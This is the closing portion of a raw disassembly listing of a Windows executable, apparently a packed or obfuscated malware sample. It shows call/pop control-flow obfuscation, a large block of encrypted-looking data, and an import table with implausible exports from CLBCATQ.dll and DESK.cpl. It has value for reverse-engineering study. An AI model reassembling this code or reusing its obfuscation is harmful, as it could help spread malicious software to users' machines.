var_2C		= dword	ptr -2Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	eax, dword_4BA340
		mov	[ebp+var_2C], 0FFFFD47Eh
		push	eax
		mov	edi, 0
		push	edi
		rep call sub_401F2D
		mov	eax, ds:LocalFree
		jmp	eax
sub_401F04	endp


; =============== S U B	R O U T	I N E =======================================


sub_401F2D	proc near		; CODE XREF: sub_401F04+1Cp
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	edx
		push	edx
		call	sub_401280
		add	esp, 8
		pop	eax
		push	eax
		mov	ecx, 0
		push	ecx
		rep call sub_401F51
		mov	eax, ds:SetLastError
		jmp	eax
sub_401F2D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401F51	proc near		; CODE XREF: sub_401F2D+17p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 30h
		pop	ebp
		retn	0
sub_401F51	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F8C	proc near		; CODE XREF: sub_4014B3+Bp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	ebx, dword_4BA1D8
		add	esi, ebx
		push	0
		rep call sub_401FAB
		mov	eax, ds:SetLastError
		jmp	eax
sub_401F8C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401FAB	proc near		; CODE XREF: sub_401F8C+12p
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+88h]
		push	esi
		push	eax
		call	sub_401728
		add	esp, 0Ch
		pop	ebx
		mov	edx, 0
		push	edx
		rep call sub_401FD3
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401FAB	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401FD3	proc near		; CODE XREF: sub_401FAB+1Bp
		pop	ecx
		call	ecx
		add	esp, 24h
		pop	ebp
		retn	0
sub_401FD3	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C3h	dup(90h)
		dd 87364F96h, 0AEC65360h, 0FA8D7812h, 0BAB5FA70h, 0D918B2A9h
		dd 0BE458F5h, 6F7A84F3h, 67C95C28h, 4483C749h, 5D6E28B3h
		dd 700161D6h, 0A4B649B1h
		db 6Eh,	15h
word_4020D2	dw 0DE50h		; DATA XREF: sub_401D19+Fo
		dd 17A1DDB7h, 0F6AF1124h, 12FED0E4h, 40ABF0D3h,	35ADC91Ah
		dd 0E9A6FDD1h, 199575DBh, 74B54512h, 0AB8E6EB1h, 59EAFC13h
		dd 0D4F6EE5Ah, 9605D92Ah, 0BA5E3E35h, 7B5CB7E4h, 0C40DE711h
		dd 9EF95CEFh, 0DCF9518Ch, 12894A21h, 6C46B7EFh,	0CADCB4C2h
		dd 8D7A529Eh, 0C3C2D6B3h, 948190ECh, 0F7279AF4h, 6D5B9EF1h
		dd 0BA3395CFh, 0F8E5886Ch, 6E93C4D1h, 0BBFC8597h, 6BEA2299h
		dd 1FFB5018h, 79D85747h, 0C7981AE5h, 5D1E0B51h,	5200FABFh
		dd 0DDA3EAA0h, 12180AAFh, 20450A7h, 7F9CDDA5h, 0CE01912Dh
		dd 98F9081Eh, 0BA2835F0h, 0C7DEE507h, 221A763Fh, 4D4FC4E0h
		dd 0B0FC5217h, 0A886D0DCh, 31F47F91h, 6010C037h, 5061A04Fh
		dd 0AF33A5D7h, 0B40E8313h, 266326C3h, 21CDC4F2h, 0C6EA6DABh
		dd 49E0C881h, 0B18EF317h, 0ABE26E8Ch, 7119C8B9h, 4EF7A8DFh
		dd 0EFC522F6h, 9F128E84h, 252B10F6h, 22430296h,	6F46831Fh
		dd 0C8DCBEA0h, 9BE4F120h, 0B01897C5h, 92480489h, 362F54BFh
		dd 4F3C61F6h, 0AF352607h, 24713C87h, 0ED2606B0h, 954508FDh
		dd 72267F4Fh, 0D20539E5h, 4E0C8364h, 51FCD28Fh,	0DECB4DC8h
		dd 25E1E47Bh, 0AF03CE47h, 0AE066067h, 9137448Ch, 38E4624Bh
		dd 0AB199765h, 2D691C71h, 0E1CE71C7h, 0A010C630h, 0B3041C72h
		dd 0B24E4DC1h, 78292BF3h, 0AE3DBB5Dh, 28387355h, 9F3CD2ABh
		dd 5BD4EE6Ah, 0C661142Ah, 2925758Fh, 0B370A690h, 8F798EE0h
		dd 39C3399Bh, 0E49EE51Ah, 8E18E572h, 0B8F38D86h, 2FDCA1B2h
		dd 0D1823B22h, 18BEE679h, 0A4D68C27h, 694B9ECh,	8C1E395h
		dd 54D81A76h, 0E19866DDh, 9BABB791h, 7CAD4843h,	0EA1AE71Ah
		dd 837C8375h, 5B32475Dh, 6928D3B7h, 0D860B624h,	14E84651h
		dd 0B616DCD7h, 0AD6D1AC4h, 92DDC89Ch, 0B7911E28h, 2E103A48h
		dd 4A140750h, 0DF33E4A8h, 923E0DABh, 0B9E151A2h, 0B304572Eh
		dd 0EE21D8F3h, 89EF378Ah, 3087643Ah, 9B0C5207h,	3E5A9ABCh
		dd 9D48B695h, 0B25C5B40h, 1D56D25Fh, 65D80A45h,	0D3A07969h
		dd 9A1A384Ah, 88F23BD5h, 0B1476719h, 7DDBA377h,	4DE87E44h
		dd 0CD8ED154h, 9F6695E1h, 5CC82ACFh, 0B06A768Fh, 921F1509h
		dd 3647C67Fh, 70322916h, 0D8A7707Bh, 0A4F2D352h, 8589CAE3h
		dd 0B27BA03Bh, 27C2D8FDh, 71141381h, 0CAF93ACCh, 9A8361BEh
		dd 27BD9FA0h, 42A04454h, 0BF9B88DEh, 0FA0A99F0h, 5A4C035Bh
		dd 0ABE65451h, 96A19C5Ah, 15729362h, 0E85289DAh, 0B7133116h
		dd 777B9BCAh, 0C557B62Ah, 2C5F24EAh, 6AD06E2Fh,	4B387F73h
		dd 0D168C046h, 984D23ECh, 27DC6E09h, 708A54A9h,	8C4626A6h
		dd 8A2F3DFDh, 3B50656Bh, 3AD7CD5Ah, 339901D6h, 671B837Fh
		dd 24F23E50h, 6EAAE559h, 48AA8D63h, 31A9C5A4h, 9504773Ah
		dd 414F8C8Eh, 0E3C20B81h, 4FD1FF28h, 82FDADD2h,	47F55917h
		dd 5D955299h, 59C957B3h, 61F54308h, 218982C0h, 20BA8EF2h
		dd 70B2B8EFh, 0B029FA88h, 0D8EA52C0h, 149AD707h, 0FA33EB7Ch
		dd 3F60A65h, 8BDAF9CDh,	159ED918h, 0FB08EBCDh, 0E47CFFE2h
		dd 15ACE0D1h, 83A77244h, 4A6F4A12h, 14BBE6DFh, 76A20CA1h
		dd 44AEE597h, 0DEC84734h, 0F283DC65h, 0DDBE11CCh, 92A0FED2h
		dd 0B6866896h, 7548CBB4h, 0FFFFCEB1h, 818018B0h, 3FBFBB8Fh
		dd 6C9EAE38h, 0C96F91AEh, 5CFC3728h, 0D94AA5BCh, 0A1FEB1E2h
		dd 0DCA4AB0Fh, 83236AFCh, 0FAE5D5DAh, 4D9089D7h, 8E439889h
		dd 39E8ECDFh, 79738990h, 53C63B37h, 0B5F2EF1Bh,	268F41C3h
		dd 72A05F1Eh, 20AFD070h, 0EFA797B0h, 2D20BE27h,	3BB30208h
		dd 1CC467BDh, 0F29DCC42h, 40E18E26h, 608F38EFh,	89E0D7D0h
		dd 0BC8F9438h, 0DBD8AA2Bh, 9393AAEEh, 70CE9ED0h, 0C898B0D8h
		dd 0D5C41BDBh, 969DF216h, 6EB97B3Ch, 0C9A342A2h, 27AED2F6h
		dd 4D6BF046h, 5B3A5D68h, 18CD633Eh, 0DCE6D9D9h,	0F10919Eh
		dd 7C6BB789h, 4D22993Ch, 1A7413A7h, 0B94F0BA1h,	2892CC6Bh
		dd 0D4B699CAh, 96A4B4C0h, 389DA8F9h, 9F79577Bh,	3E38ACB7h
		dd 64401EA7h, 9B0B4D29h, 0A7C3DEC7h, 60EEBDA7h,	5333FBEEh
		dd 0BAC805F2h, 26FCC068h, 0E181EC49h, 10CEF1EDh, 0F5238709h
		dd 7AEDC1CFh, 6671CA1Eh, 0AEC71AF1h, 0FE9BD34Ah, 0C8AA196h
		dd 3F45FBAAh, 0C92D527Bh, 9CF556C2h, 72DB53F1h,	0BF1DA660h
		dd 59D9D1C3h, 1C93171Eh, 12DAB8FAh, 3209C0Eh, 0FFEFB6B6h
		dd 992988A4h, 0BFEB3BADh, 89DB8E99h, 3C9E38B3h,	0A206E2F9h
		dd 3EB49B10h, 30310279h, 0DDB774Fh, 7AAAE5BDh, 83398D21h
		dd 9FA69A9Bh, 33CD9F33h, 0B013066h, 0AEFF67CFh,	1380B70Eh
		dd 9315A381h, 0A4A06CAh, 860F529Ah, 40147AF7h, 6080FEC4h
		dd 0D0BF815Eh, 1914FFD5h, 7348D45Bh, 8760CE28h,	3C237E61h
		dd 266F5925h, 0EDC85592h, 26C049BFh, 0D5009E81h, 16001D2Bh
		dd 237463D2h, 0E233367Bh, 8E3AC838h, 0F967A039h, 83203858h
		dd 0FF74E429h, 12FDB5Fh, 74567BB8h, 3D3B2A8Ah, 0B236DD2Bh
		dd 0AAECE769h, 1B14990Fh, 0B36007C9h, 26260385h, 0BD450A93h
		dd 0A947CB0Ah, 0AC0302D0h, 66897E97h, 0DF82C1D8h, 7BBE9F13h
		dd 0E794097Dh, 387C8688h, 14BB3B49h, 0A1FB0CC4h, 0AF2D3D4Eh
		dd 2C416DAEh, 2D4055EDh, 3FB0D462h, 61A834B7h, 153942A4h
		dd 0FAA3E21Eh, 13D25379h, 0F796D6A0h, 5B494AFh,	0FEA5B610h
		dd 3413E7F7h, 33B072FAh, 0CD552CDDh, 0A24A39C4h, 0BFDDD19Eh
		dd 8E7C1730h, 0BDC052F5h, 2D914C84h, 0A41D9434h, 0E27E7B36h
		dd 0F56E2882h, 0E63EBBF1h, 5613F3CAh, 4DB8315Ch, 0C5A65B56h
		dd 0A16D064Ch, 89C65F9Bh, 0A41A5BF5h, 2E5AD66Fh, 40D294D8h
		dd 3595B5FEh, 0E7A5B011h, 0DAE2CE3h, 62A5748Eh,	4FAD46BDh
		dd 2EA8AFF8h, 51AC1224h, 0D8A9F76Eh, 941507B2h,	0B65D7D90h
		dd 7C514137h, 0C3FBB563h, 9F832A12h, 94F2DF6h, 0D0D43A04h
		dd 0D42044A0h, 0CE3D2AB3h, 54BF3755h, 62C0EAEEh, 0C180ECD1h
		dd 5C9FA570h, 804B9A26h, 639B0789h, 3C8B1884h, 2BB88B6Bh
		dd 0D7EA3FF5h, 9893099Fh, 1A70223Bh, 8F07EFF9h,	1B79304h
		dd 0BF31FE60h, 34E9272Ch, 668C23A9h, 4DB9EE2Bh,	0DAA308EAh
		dd 93AE7B8Ah, 0B7A8C23Ah, 0A5AB9EE2h, 0AEAA308Eh, 0B7AAE7B8h
		dd 7BAA8C24h, 0C7AAB9F2h, 0F95A306h, 45B56CBCh,	4EC782C9h
		dd 4AA4C50h, 579561FBh,	1Bh dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 000B7000 ( 749568.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 0005FC00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 403000h
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
CreateFileA	dd ?
; BOOL __stdcall PulseEvent(HANDLE hEvent)
PulseEvent	dd ?			; DATA XREF: sub_4010E0+21r
					; sub_4019FE+Fr
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
CreateThread	dd ?			; DATA XREF: start+8r .rdata:00403024o
; DWORD	__stdcall GetTickCount()
GetTickCount	dd ?			; DATA XREF: sub_401280+2Fr
					; sub_40141E+Fr ...
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
GetSystemTime	dd ?
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
UnmapViewOfFile	dd ?			; DATA XREF: sub_401308+Dr
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
LoadLibraryW	dd ?			; DATA XREF: start+21r	sub_401CD4+31o	...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
LocalFree	dd ?			; DATA XREF: sub_401198+31r
					; sub_401379+23r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
Sleep		dd ?			; DATA XREF: sub_401211+2Br
					; sub_401728+18r ...
		dd offset CreateThread
; int __stdcall	lstrlenA(LPCSTR	lpString)
lstrlenA	dd ?			; DATA XREF: sub_4011D0+Fr
					; sub_4011F0+1Ar ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
HeapCreate	dd ?
; LPWSTR __stdcall GetCommandLineW()
GetCommandLineW	dd ?			; DATA XREF: sub_4014B3+1Ar
					; sub_4016A3+1Br ...
; BOOL __stdcall SetEvent(HANDLE hEvent)
SetEvent	dd ?			; DATA XREF: sub_401490+1Cr
; void __stdcall SetLastError(DWORD dwErrCode)
SetLastError	dd ?			; DATA XREF: sub_401440+19r
					; sub_401684+18r ...
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
GetCurrentDirectoryA dd	?
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
GetComputerNameA dd ?
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
GetModuleHandleA dd ?			; DATA XREF: sub_4010B5+16o
					; sub_4013E0+37r ...
; BOOL __stdcall LocalUnlock(HLOCAL hMem)
LocalUnlock	dd ?			; DATA XREF: sub_401358+1Ar
					; sub_401460+1Cr ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
CloseHandle	dd ?			; DATA XREF: sub_401108+1Cr
		dd 0
;
; Imports from USER32.dll
;
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
DrawEdge	dd ?
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
GetDlgItem	dd ?
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
CheckRadioButton dd ?
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
GetScrollBarInfo dd ?
; BOOL __stdcall DrawMenuBar(HWND hWnd)
DrawMenuBar	dd ?
; HDC __stdcall	GetDC(HWND hWnd)
GetDC		dd ?			; DATA XREF: sub_4012D8+29r
					; sub_401C70+20r ...
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
CallWindowProcA	dd ?
; SHORT	__stdcall GetKeyState(int nVirtKey)
GetKeyState	dd ?
; HWND __stdcall SetFocus(HWND hWnd)
SetFocus	dd ?			; DATA XREF: sub_401090+1Er
					; sub_4012B6+Dr
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
DispatchMessageA dd ?
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
CreateWindowExA	dd ?
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
FillRect	dd ?
; BOOL __stdcall IsWindow(HWND hWnd)
IsWindow	dd ?			; DATA XREF: sub_401DE4+3Ar
		dd 0
;
; Imports from CLBCATQ.dll
;
SetSetupSave	dd ?
DowngradeAPL	dd ?
CheckMemoryGates dd ?
SetupOpen	dd ?
UpdateFromAppChange dd ?
		dd 0
;
; Imports from DESK.cpl
;
InstallScreenSaver dd ?
		dd 0
		dd 3110h, 2 dup(0)
		dd 32F2h, 3000h, 3164h,	2 dup(0)
		dd 33C2h, 3054h, 319Ch,	2 dup(0)
		dd 3424h, 308Ch, 31B4h,	2 dup(0)
		dd 3446h, 30A4h, 5 dup(0)
		dd 323Eh, 3220h, 31BCh,	322Eh, 31ECh, 324Ch, 31CCh, 325Eh
		dd 32C4h, 31DCh, 32E6h,	32CCh, 32B2h, 32DAh, 31FCh, 3286h
		dd 320Ch, 329Eh, 326Ah,	3278h, 0
		dd 3388h, 3300h, 33A2h,	331Ah, 3340h, 3380h, 335Ah, 3394h
		dd 33B6h, 336Ch, 332Eh,	330Eh, 334Eh, 0
		dd 33DEh, 33CEh, 33EEh,	3418h, 3402h, 0
		dd 3430h, 0
		dd 724300B7h, 65746165h, 65726854h, 6461h, 6F4C033Dh, 694C6461h
		dd 72617262h, 5779h, 724300B7h,	65746165h, 65726854h, 6461h
		dd 65470279h, 73795374h, 546D6574h, 656D69h, 65530474h
		dd 73614C74h, 72724574h, 726Fh,	6547018Eh, 6D6F4374h, 65747570h
		dd 6D614E72h, 4165h, 7550039Bh,	4565736Ch, 746E6576h, 1C70000h
		dd 54746547h, 436B6369h, 746E756Fh, 8A0000h, 61657243h
		dd 69466574h, 41656Ch, 6E5504D7h, 5670616Dh, 4F776569h
		dd 6C694666h, 3490065h,	61636F4Ch, 6572466Ch, 34F0065h
		dd 61636F4Ch, 6C6E556Ch, 6B636Fh, 6C430054h, 4865736Fh
		dd 6C646E61h, 1C00065h
aGetcurrentdire	db 'GetCurrentDirectoryA',0
		align 2
		dw 177h
aGetmodulehandl	db 'GetModuleHandleA',0
		align 2
		dw 188h
aGetcommandline	db 'GetCommandLineW',0
		db 0B3h	; ³
		db 4, 53h, 6Ch
		db  65h	; e
		db 65h,	70h, 0
		db 0F1h	; ñ
		db 4, 48h, 65h
aApcreate	db 'apCreate',0
		align 2
		dw 45Ah
aSetevent	db 'SetEvent',0
		align 2
		dw 54Eh
aLstrlena	db 'lstrlenA',0
		align 2
aKernel32_dll	db 'KERNEL32.dll',0
		align 10h
		db  0Ch
aGetdlgitem	db 7,'GetDlgItem',0
		align 2
		dw 6DBh
aFillrect	db 'FillRect',0
		align 2
aYGetscrollbari	db 'Y',7,'GetScrollBarInfo',0
		align 2
		dw 652h
aCreatewindowex	db 'CreateWindowExA',0
		dd 724406AEh, 654D7761h, 6142756Eh, 7C00072h, 69577349h
		dd 776F646Eh, 5FB0000h,	6C6C6143h, 646E6957h, 7250776Fh
		dd 41636Fh, 69440693h, 74617073h, 654D6863h, 67617373h
		dd 4165h, 65470706h, 434474h, 724406A8h, 64457761h, 6567h
		dd 65470722h, 79654B74h, 74617453h, 6260065h, 63656843h
		dd 6461526Bh, 75426F69h, 6E6F7474h, 7110000h, 46746553h
		dd 7375636Fh, 53550000h, 32335245h, 6C6C642Eh, 40000h
		dd 6E776F44h, 64617267h, 4C504165h, 1E0000h, 53746553h
		dd 70757465h, 65766153h, 90000h, 63656843h, 6D654D6Bh
		dd 4779726Fh, 73657461h, 60000h
aUpdatefromappc	db 'UpdateFromAppChange',0
		db  1Fh
		align 2
aSetupopen	db 'SetupOpen',0
aClbcatq_dll	db 'CLBCATQ.dll',0
		db    6
		align 2
aInstallscreens	db 'InstallScreenSaver',0
		align 2
aDesk_cpl	db 'DESK.cpl',0
		align 10h
		dd 6Ch dup(0)
		dd 2DA80h dup(?)
_rdata		ends

; Section 3. (virtual address 000BA000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00060200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 4BA000h
		dd 16h dup(20202020h)
asc_4BA058	db '                                                                 '
					; DATA XREF: sub_401440+8o
		db '                                                                 '
		db '                                      m',0
aS		db 's',0
aYuvDll:
		unicode	0, <yuv*dll>,0
		dd 0Ah dup(0)
dword_4BA13C	dd 15h dup(0)		; DATA XREF: sub_4019C4+8o
dword_4BA190	dd 0Bh dup(0)		; DATA XREF: sub_401570+8o
dword_4BA1BC	dd 0			; DATA XREF: sub_401B04+8o
dword_4BA1C0	dd 6 dup(0)		; DATA XREF: sub_401CD4+Bo
dword_4BA1D8	dd 0			; DATA XREF: sub_401F8C+8o
dword_4BA1DC	dd 0Fh dup(0)		; DATA XREF: sub_4011F0+8o
dword_4BA218	dd 0			; DATA XREF: sub_4012D8+8o
dword_4BA21C	dd 3 dup(0)		; DATA XREF: sub_401090+8o
dword_4BA228	dd 4 dup(0)		; DATA XREF: sub_401358+8o
dword_4BA238	dd 0Dh dup(0)		; DATA XREF: sub_4016D0+8o
dword_4BA26C	dd 23h dup(0)		; DATA XREF: sub_401C4C+8o
dword_4BA2F8	dd 0Ah dup(0)		; DATA XREF: sub_401A80+8o
dword_4BA320	dd 8 dup(0)		; DATA XREF: sub_401D84+8o
dword_4BA340	dd 4 dup(0)		; DATA XREF: sub_401F04+8o
dword_4BA350	dd 1Eh dup(0)		; DATA XREF: sub_401728+8o
dword_4BA3C8	dd 8Eh dup(0)		; DATA XREF: sub_401684+8o
		align 1000h
_data		ends


		end start
